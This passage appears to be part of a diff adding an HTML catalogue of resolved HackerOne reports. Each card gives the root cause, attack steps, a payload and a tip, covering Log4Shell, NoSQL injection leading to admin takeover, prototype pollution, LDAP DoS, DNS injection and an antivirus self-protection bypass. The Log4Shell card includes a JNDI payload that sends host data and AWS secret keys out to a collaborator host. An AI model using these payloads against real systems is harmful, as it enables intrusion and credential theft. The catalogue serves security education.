+<h4>Root cause</h4><p style="margin:0">Log4j &lt;2.15 performs JNDI/LDAP lookups on logged strings via ${jndi:...} message substitution. Any user-controlled value that gets logged (URL param, header, UA) triggers an outbound LDAP fetch and remote class loading = RCE. Nested lookups like ${hostName} exfiltrate host data over DNS.</p>
+<h4>Method</h4><ol><li>Identify a value that is logged (URL param, User-Agent, X-Api-Version, etc.)</li><li>Inject a jndi:ldap payload pointing at your collaborator, nesting ${hostName}/${env:...} to leak data in the DNS label</li><li>Observe the callback (DNS/LDAP) to confirm, then serve a malicious class for full RCE</li></ol>
+<div class="pre">${jndi:ldap://x${hostName}.log4j.COLLAB.burpcollaborator.net/a}</div>
+<p class="insight"><b>Insight —</b> Spray the jndi payload across every input that could be logged (headers especially: User-Agent, X-Forwarded-For, Referer, auth tokens). Nest ${hostName}/${env:AWS_SECRET_ACCESS_KEY} in the DNS label to exfil even when egress to LDAP is blocked but DNS resolves.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1429014" target="_blank" rel="noopener">hackerone.com/reports/1429014</a></span><a class="src" href="#report-1429014" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1130721" style="--sv:var(--sev-crit)" data-sev="4" data-votes="20" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Pre-auth blind NoSQL injection ($regex) -&gt; reset-token exfil -&gt; admin ATO -&gt; RCE</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1130721</b> · rocket_chat · none · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>api</b></span><span>Chain <b>NoSQLi (blind $regex) -&gt; leak reset token -&gt; admin acc</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An unauthenticated method (getPasswordPolicy) passes an unvalidated token straight into a Mongo query. Supplying a query-operator object instead of a string turns equality into an attacker-controlled predicate, enabling char-by-char boolean extraction.</p>
+<h4>Method</h4><ol><li>Call getPasswordPolicy anonymously via /api/v1/method.callAnon</li><li>Send token as {"$regex":"^A"}; policy-returned vs error reveals the guessed prefix</li><li>Iterate per position/char to leak the full password-reset token</li><li>Reset victim (admin) password, log in, create incoming webhook with a script -&gt; server-side code execution</li></ol>
+<div class="pre">POST /api/v1/method.callAnon
+{"message":"{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^A\"}}]}"}
+# policy returned == prefix correct; else error. Walk ^.{i}CHAR to leak token.</div>
+<p class="insight"><b>Insight —</b> Any param landing in a Mongo/NoSQL filter that is not coerced to a string is injectable: swap the string for {"$regex":..},{"$gt":..},{"$ne":..}. Boolean/blind oracles (200 vs error, policy vs no policy) exfiltrate reset tokens and pivot to ATO; admin ATO on chat/CMS apps frequently reaches RCE via a scriptable integration/webhook.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1130721" target="_blank" rel="noopener">hackerone.com/reports/1130721</a></span><a class="src" href="#report-1130721" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1581059" style="--sv:var(--sev-crit)" data-sev="4" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>MongoDB regex NoSQL injection to steal admin reset token</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1581059</b> · rocket_chat · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>api</b></span><span>Chain <b>low-priv auth -&gt; regex NoSQLi on admin reset token -&gt; </b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A query accepts an operator object so an authenticated low-priv user can pass a {$regex} on the admin's password-reset token field; matching prefixes true/false leaks the token character by character, enabling admin account takeover.</p>
+<h4>Method</h4><ol><li>Authenticate as a normal user and capture rc_uid/rc_token</li><li>Locate the admin email/user via the same injectable query</li><li>Send {$regex:'^X'} style predicates against the reset-token field and observe hit/no-hit</li><li>Reconstruct the full reset token, then set a new admin password</li></ol>
+<div class="pre">// conceptual: field accepts an object instead of a string
+{ "token": { "$regex": "^&lt;GUESS&gt;" } }  // true when prefix matches</div>
+<p class="insight"><b>Insight —</b> Any MongoDB-backed field that accepts a JSON object instead of a scalar is a NoSQL injection sink; $regex/$gt turn secret comparisons into a blind char-by-char oracle. Reset tokens, API keys and password hashes are prime targets. CVE-2022-32211.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1581059" target="_blank" rel="noopener">hackerone.com/reports/1581059</a></span><a class="src" href="#report-1581059" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-906959" style="--sv:var(--sev-crit)" data-sev="4" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>LDAP injection in ldapjs OR-filter -&gt; DoS (and auth-bypass primitive)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#906959</b> · nodejs-ecosystem · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>LDAP filter injection -&gt; filter amplification -&gt; resou</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The login username is interpolated straight into an LDAP OR-filter string with no escaping, so LDAP filter metacharacters ( * ( ) ) are interpreted as filter syntax. A crafted username with thousands of nested presence sub-filters makes the server evaluate a huge filter until it OOMs (DoS); '*' also matches all entries.</p>
+<h4>Method</h4><ol><li>Post to the login endpoint with a username containing LDAP filter syntax.</li><li>Use '*' to test presence/auth-affecting behavior; use a repeated '(cn=*)' payload to inflate the filter.</li><li>Server evaluates the enormous filter and crashes (JavaScript heap OOM).</li></ol>
+<div class="pre"># vulnerable: filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`
+# DoS username:
+payload = "*)" + "(cn=*)"*700000 + "(cn=*"
+POST /api/login  username=&lt;payload&gt;&amp;password=pass</div>
+<p class="insight"><b>Insight —</b> Any login/search that builds an LDAP filter by string concatenation is injectable. '*' is a presence wildcard (info disclosure/auth issues); nested (cn=*) sub-filters cause catastrophic evaluation (DoS). Escape * ( ) \ NUL per RFC4515. Detection: a single unbalanced ')' or double-quote often throws an LDAP error (e.g. 0x80005000), confirming the sink (#359290).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/906959" target="_blank" rel="noopener">hackerone.com/reports/906959</a></span><a class="src" href="#report-906959" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-778414" style="--sv:var(--sev-crit)" data-sev="4" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution in klona deep-clone (CVE-2020-8125)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#778414</b> · nodejs-ecosystem · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>web</b></span><span>Chain <b>__proto__ key in cloned object -&gt; Object.prototype pollut</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">CVE-2020-8125: klona &lt; 1.1.1 deep-clones objects by recursively copying keys including __proto__, so cloning an attacker-supplied object writes to Object.prototype, adding arbitrary properties globally.</p>
+<h4>Method</h4><ol><li>Pass an object with a __proto__ key (e.g. from JSON) into klona().</li><li>The recursive clone assigns through __proto__, polluting Object.prototype.</li><li>Observe the injected property on unrelated objects; override methods like toString for DoS/possible RCE gadgets.</li></ol>
+<div class="pre">const klona = require('klona');
+klona(JSON.parse('{"__proto__":{"polluted":"yes"}}'));
+console.log(({}).polluted); // "yes"</div>
+<p class="insight"><b>Insight —</b> Any deep-clone/merge/extend utility that walks keys without skipping __proto__/constructor/prototype is a prototype-pollution sink. When auditing Node dependencies, feed JSON.parse'd objects with __proto__ into clone/merge helpers and check ({}).&lt;injected&gt;. Pollution of toString/other prototype methods can escalate from DoS to RCE via downstream gadgets.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/778414" target="_blank" rel="noopener">hackerone.com/reports/778414</a></span><a class="src" href="#report-778414" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-381185" style="--sv:var(--sev-crit)" data-sev="4" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive merge/extend (__proto__ injection)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#381185</b> · nodejs-ecosystem · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; gadget in template/engine (e.g. EJ</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Recursive object-merge/clone helpers (extend, merge, defaultsDeep, jQuery-style deep copy) walk attacker-supplied JSON keys without blocking __proto__/constructor/prototype, so a payload key writes onto Object.prototype and pollutes every object in the process.</p>
+<h4>Method</h4><ol><li>Find a sink that deep-merges attacker JSON into an object: extend(true,{},input), _.merge, Object.assign-recursive, config/query/body parsers.</li><li>Send a JSON body whose top key is __proto__ with the property you want on all objects.</li><li>Confirm pollution: read the injected prop on a fresh unrelated object ({}.isAdmin).</li><li>Escalate: pick a prop the app later reads (isAdmin, is_admin, ejs template opts, cmd/shell paths) to flip auth logic, cause DoS, or reach gadget-based RCE.</li></ol>
+<div class="pre">let extend = require('extend');
+let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
+extend(true, {}, payload);
+console.log({}.isAdmin); // true
+
+// also: '{"__proto__":{"polluted":"x"}}' into lutils-merge/merge(...)</div>
+<p class="insight"><b>Insight —</b> Any recursive merge/clone of untrusted JSON is a prototype-pollution sink. Test every deep-merge with a __proto__ key and probe {}.&lt;injected&gt; on a fresh object; then chain the polluted prop into the app's own logic for auth bypass, DoS, or RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/381185" target="_blank" rel="noopener">hackerone.com/reports/381185</a></span><a class="src" href="#report-381185" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1106238" style="--sv:var(--sev-high)" data-sev="3" data-votes="58" data-bounty="3000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side prototype pollution via Mermaid %%{init}%% __proto__ directive</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1106238</b> · gitlab · USD 3000 · 58 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Chain <b>stored mermaid directive -&gt; Object.prototype pollution -&</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Mermaid init directives (%%{init: {JSON}}%%) merge attacker JSON into config without sanitizing __proto__, so a diagram in any issue/comment pollutes Object.prototype for every user who renders it (realized impact: persistent DoS; XSS attempted but not achieved).</p>
+<h4>Method</h4><ol><li>Insert a mermaid code block with an init directive that sets __proto__</li><li>Save it in an issue/comment/wiki</li><li>Anyone opening the page gets a polluted prototype, breaking the app for them</li></ol>
+<div class="pre">%%{init: { '__proto__': {'polluted': 'asdf'}} }%%
+sequenceDiagram
+Alice-&gt;&gt;Bob: Hi Bob
+Bob-&gt;&gt;Alice: Hi Alice</div>
+<p class="insight"><b>Insight —</b> Client-side renderers that merge user-supplied JSON/config (Mermaid, markdown extensions, theming) are prototype-pollution sinks; test __proto__/constructor.prototype keys in any diagram/config directive. Even without an XSS gadget the pollution is a stored DoS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1106238" target="_blank" rel="noopener">hackerone.com/reports/1106238</a></span><a class="src" href="#report-1106238" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-712065" style="--sv:var(--sev-high)" data-sev="3" data-votes="19" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>lodash prototype pollution via zipObjectDeep/merge/defaultsDeep</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#712065</b> · nodejs-ecosystem · awarded · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>Prototype pollution -&gt; depending on gadget: DoS/crash, au</b></span></div>
+<h4>Root cause</h4><p style="margin:0">lodash merge/mergeWith/defaultsDeep/zipObjectDeep follow attacker-controlled property paths without blocking __proto__/constructor/prototype, so a crafted path writes onto Object.prototype - polluting all objects. Impact ranges from DoS/crash to logic bypass or RCE depending on downstream sinks (CVE-2020-8203).</p>
+<h4>Method</h4><ol><li>Find a code path that feeds user input into lodash merge/defaultsDeep/set/zipObjectDeep with a controllable key path</li><li>Supply a path traversing __proto__ (e.g. ['__proto__.z'])</li><li>Object.prototype gains the injected property -&gt; pollutes all objects</li></ol>
+<div class="pre">const _ = require('lodash');
+_.zipObjectDeep(['__proto__.z'], [123]);
+console.log(({}).z); // 123  -&gt; Object.prototype polluted
+// also: _.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'))</div>
+<p class="insight"><b>Insight —</b> Recursive-merge/deep-set helpers are the canonical prototype-pollution sink. Whenever user JSON is merged into config/options objects, test __proto__/constructor.prototype gadget keys. Even without RCE, polluting a widely-read property reliably crashes or DoSes the server. Follow the polluted property to a downstream gadget (e.g. template outputFunctionName) for escalation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/712065" target="_blank" rel="noopener">hackerone.com/reports/712065</a></span><a class="src" href="#report-712065" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-380873" style="--sv:var(--sev-high)" data-sev="3" data-votes="14" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>lodash prototype pollution via constructor.prototype (CVE-2018-16487)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#380873</b> · nodejs-ecosystem · awarded · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>prototype pollution -&gt; DoS (toString/valueOf clobber) or </b></span></div>
+<h4>Root cause</h4><p style="margin:0">After merge/mergeWith/defaultsDeep were patched to block __proto__, the same recursive-merge sink can still be reached through constructor.prototype, letting attacker JSON set properties on Object.prototype for all objects.</p>
+<h4>Method</h4><ol><li>Find a recursive merge/extend of attacker JSON into an object</li><li>Send {"constructor":{"prototype":{"isAdmin":true}}}</li><li>Confirm ({}).isAdmin === true</li></ol>
+<div class="pre">var _ = require('lodash');
+var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
+_.merge({}, payload);
+console.log({}.isAdmin); // true</div>
+<p class="insight"><b>Insight —</b> When __proto__ is filtered, try the constructor.prototype path to reach the same prototype. Always test both keys against any deep-merge/clone/extend that ingests user JSON.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/380873" target="_blank" rel="noopener">hackerone.com/reports/380873</a></span><a class="src" href="#report-380873" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1130874" style="--sv:var(--sev-high)" data-sev="3" data-votes="13" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind MongoDB NoSQL injection ($where) -&gt; account takeover -&gt; RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1130874</b> · rocket_chat · none · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>api</b></span><span>Chain <b>blind NoSQLi -&gt; leak reset token + 2FA -&gt; password res</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The users.list API passes the client-supplied query parameter into a MongoDB query without validation, allowing a $where JavaScript oracle that boolean-leaks any field of any user document (email, password reset token, 2FA secret) one character at a time.</p>
+<h4>Method</h4><ol><li>Send a $where query that returns the target doc only if a guessed char of a secret field matches</li><li>Iterate over positions/charset to fully leak the admin's email and password reset token (and 2FA secret if set)</li><li>Request a password reset for the admin, use the leaked token (+2FA) to set a known password</li><li>As admin, create an incoming webhook with a server-side script to run commands -&gt; RCE</li></ol>
+<div class="pre">query={"$where":"this.roles.includes('admin') &amp;&amp; /^A/.test(this.services.password.reset.token)"}</div>
+<p class="insight"><b>Insight —</b> Any endpoint that forwards a JSON/query object into a NoSQL backend is a candidate for $where/regex blind injection. Even with restricted returned fields you can build a boolean oracle to exfiltrate hidden fields (tokens/secrets), then chain reset-&gt;admin-&gt;RCE. Test operator injection ($where, $regex, $ne) on every query-taking API.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1130874" target="_blank" rel="noopener">hackerone.com/reports/1130874</a></span><a class="src" href="#report-1130874" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-730779" style="--sv:var(--sev-high)" data-sev="3" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Trailing whitespace in header value bypasses Host allow/deny lists (http_parser)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#730779</b> · nodejs · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node http_parser did not trim trailing optional whitespace (OWS) from header values, so 'Host: victim.com ' is passed up with the trailing space intact; downstream matchers that compare against 'victim.com' fail to match, letting blocked hosts through.</p>
+<h4>Method</h4><ol><li>Send a request with a trailing space after the header value</li><li>Observe the parser emits the value including the trailing whitespace</li><li>A proxy/gateway configured to block that exact host string no longer matches -&gt; request tunnels through</li></ol>
+<div class="pre">GET / HTTP/1.1\r\nHost: my-super-private-domain.com \r\nHello: World\r\n\r\n</div>
+<p class="insight"><b>Insight —</b> HTTP parser/normalizer discrepancies are a filter-bypass goldmine: test trailing/leading whitespace, tabs, and other OWS around header values against any proxy that makes allow/deny decisions on header strings.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/730779" target="_blank" rel="noopener">hackerone.com/reports/730779</a></span><a class="src" href="#report-730779" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-864701" style="--sv:var(--sev-high)" data-sev="3" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via unsafe recursive merge / deep-set (npm lodash, merge)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#864701</b> · nodejs-ecosystem · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; tampered app-trusted property (isA</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Recursive object merge / path-based set functions walk attacker-controlled keys without blocking __proto__/constructor/prototype, so a payload of {__proto__:{...}} or a path like __proto__[x] writes onto Object.prototype, affecting every object (DoS via poisoned toString/valueOf, and often property injection -&gt; auth bypass/RCE downstream).</p>
+<h4>Method</h4><ol><li>Locate a sink that deep-merges or deep-sets attacker JSON (config merge, query parser, ORM, template options).</li><li>Send {"__proto__":{"polluted":"x"}} to a merge sink, or a path string __proto__[polluted]=x to a set sink.</li><li>Confirm with ({}).polluted; escalate by polluting a property the app trusts (isAdmin, toString, template options).</li></ol>
+<div class="pre">// lodash set/setWith (#864701):
+lod.setWith({}, "__proto__[test]", "123")
+lod.set({}, "__proto__[test2]", "456")
+console.log(({}).test)   // 123
+
+// merge.recursive (#381194):
+let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
+merge.recursive({}, payload);
+console.log(({}).isAdmin) // true</div>
+<p class="insight"><b>Insight —</b> Test every JSON body / config merge / deep-set path with __proto__ (object form) and constructor.prototype, and with bracket-path strings for lodash-style set. Impact ranges from DoS (poison toString) to auth bypass and RCE via gadget properties.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/864701" target="_blank" rel="noopener">hackerone.com/reports/864701</a></span><a class="src" href="#report-864701" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-904064" style="--sv:var(--sev-high)" data-sev="3" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTML injection into platform-sent invite emails -&gt; trusted-sender phishing</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#904064</b> · deptofdefense · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>stored HTML in share message -&gt; unsanitized outbound emai</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A dashboard-sharing 'message' field is not sanitized for HTML before being embedded in the invitation email the platform sends, so an attacker crafts formatted spearphishing that arrives from a trusted first-party mail server.</p>
+<h4>Method</h4><ol><li>Create a dashboard and use Share -&gt; 'Add groups and users'</li><li>Put HTML into the invitation Message field and enable 'send email invitation'</li><li>Recipient gets a first-party email rendering the injected HTML</li></ol>
+<div class="pre">Message: &lt;b&gt;Action required&lt;/b&gt; &lt;a href="https://attacker/login"&gt;Re-authenticate here&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Notification/invite/share message fields that feed outbound email are HTML-injection sinks with high phishing value because the mail originates from the target's trusted domain; test formatting tags and links (some img tags may be stripped).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/904064" target="_blank" rel="noopener">hackerone.com/reports/904064</a></span><a class="src" href="#report-904064" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1178337" style="--sv:var(--sev-high)" data-sev="3" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Injection &amp; domain hijack via unfiltered characters in DNS answers</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1178337</b> · nodejs · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>api</b></span><span>Chain <b>attacker DNS record -&gt; unfiltered hostname in library out</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node's dns library returns hostnames from DNS answers (CNAME/PTR) without restricting them to [a-z0-9-.]; embedded NUL bytes and HTML/JS metacharacters pass through, so an attacker who controls a DNS record can smuggle injection payloads or truncate a name into a different domain (cache poisoning / hijack).</p>
+<h4>Method</h4><ol><li>Stand up an authoritative zone (bind9 with check-names disabled)</li><li>Publish a CNAME/PTR whose label contains \x00 or an injection payload like &lt;img src onerror=alert()&gt;</li><li>Make the target app resolve the attacker host (or reverse-resolve an attacker IP)</li><li>App reflects/logs/stores/caches the raw hostname -&gt; XSS / log injection / SQLi / DNS-cache domain hijack</li></ol>
+<div class="pre">; CNAME with embedded NUL truncates the apparent domain:
+cnamezeroweb  IN CNAME  zero.longtxtrecord.ml\000cnamezeroweb.test.example.net.
+; CNAME carrying an XSS payload label:
+cnamexss      IN CNAME  &lt;img/src=''/onerror='alert("xss")'&gt;.a.cnamexss.test.example.net.
+; reverse PTR variant:
+3.3.3.3.in-addr.arpa.  IN PTR  &lt;img/src=''/onerror='alert(1)'&gt;.example.com.</div>
+<p class="insight"><b>Insight —</b> Treat DNS responses as untrusted input. Any app that reverse-resolves client IPs or follows CNAMEs and then logs/renders/stores the name is XSS/log-injection/cache-poisonable. Offensively, control a zone with special-char labels; glibc's gethostbyname filters these, naive libraries do not.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1178337" target="_blank" rel="noopener">hackerone.com/reports/1178337</a></span><a class="src" href="#report-1178337" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1001218" style="--sv:var(--sev-high)" data-sev="3" data-votes="0" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive deep-merge (@firebase/util deepExtend/deepCopy)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1001218</b> · nodejs-ecosystem · none ·  votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>prototype pollution -&gt; gadget-dependent escalation (auth-</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A recursive object merge/clone that walks attacker-controlled keys without excluding __proto__/constructor/prototype assigns into Object.prototype, so an attacker-supplied key like __proto__.polluted sets a property present on every object in the process.</p>
+<h4>Method</h4><ol><li>Feed the merge/clone function a JSON object whose key is __proto__ containing the property to inject</li><li>Call the vulnerable deep-merge (deepExtend) or deep-clone (deepCopy) with the crafted source</li><li>Read the injected property off an unrelated fresh object to confirm global prototype pollution</li></ol>
+<div class="pre">const utils = require('@firebase/util');
+const obj = {};
+const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+console.log('Before : ' + obj.polluted); // undefined
+utils.deepExtend({}, source);
+// utils.deepCopy(source);
+console.log('After : ' + obj.polluted);  // yes</div>
+<p class="insight"><b>Insight —</b> Any JS library exposing a recursive merge/extend/clone/set-by-path helper is a prototype-pollution sink. Use JSON.parse of a raw '{"__proto__":{...}}' string (object literals resolve __proto__ specially, JSON.parse keeps it as an own key) and check a fresh object for the injected prop. Downstream impact depends on the host app: polluted properties can flip auth flags, inject template/config values, cause DoS, or reach RCE when a polluted key lands in a dangerous gadget (e.g. child_process options, EJS/Handlebars options).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1001218" target="_blank" rel="noopener">hackerone.com/reports/1001218</a></span><a class="src" href="#report-1001218" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-870615" style="--sv:var(--sev-high)" data-sev="3" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>AV self-protection bypass via SetWindowsHookEx DLL injection</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#870615</b> · kaspersky · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>kaspersky</b></span><span>Surface <b>desktop</b></span><span>Chain <b>DLL injection -&gt; WinAPI hooks -&gt; auto-confirm self-pro</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Kaspersky hooked ClientLoadLibrary to block injection into its UI (avpui.exe), but the block was by dll filename allowlist; a DLL named like an allowed module (tiptsf.dll) could still be injected via SetWindowsHookEx, after which WinAPIs (TrackPopupMenu/IsDialogMessageW) are hooked to auto-confirm dialogs and disable protection.</p>
+<h4>Method</h4><ol><li>FindWindow to get the AV UI window handle (avpui.exe)</li><li>SetWindowsHookEx to inject a DLL using a filename that passes the ClientLoadLibrary allowlist (e.g. tiptsf.dll)</li><li>Hook TrackPopupMenu, send message via PostMessage</li><li>When self-protection spawns a confirmation dialog in a new avpui.exe, inject again and hook IsDialogMessageW to auto-click OK</li><li>Protection disabled; run malware</li></ol>
+<p class="insight"><b>Insight —</b> Endpoint/AV 'self-protection' that blocks injection by DLL-name allowlist is bypassable by naming your payload after a permitted module; once inside a trusted GUI process you can hook dialog/message APIs to auto-approve the very prompts meant to stop you. Look for allowlist-by-name enforcement in any injection guard.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/870615" target="_blank" rel="noopener">hackerone.com/reports/870615</a></span><a class="src" href="#report-870615" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1806939" style="--sv:var(--sev-med)" data-sev="2" data-votes="79" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>GraphQL/Voyager URN decoration injection -&gt; email DB enumeration</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1806939</b> · linkedin · awarded · 79 votes · resolved</div>
+<div class="taxo"><span>Program <b>linkedin</b></span><span>Surface <b>api</b></span><span>Chain <b>Store fs_emailAddress URN in own profile -&gt; decoration ex</b></span><span>Tag <b>graphql</b></span></div>
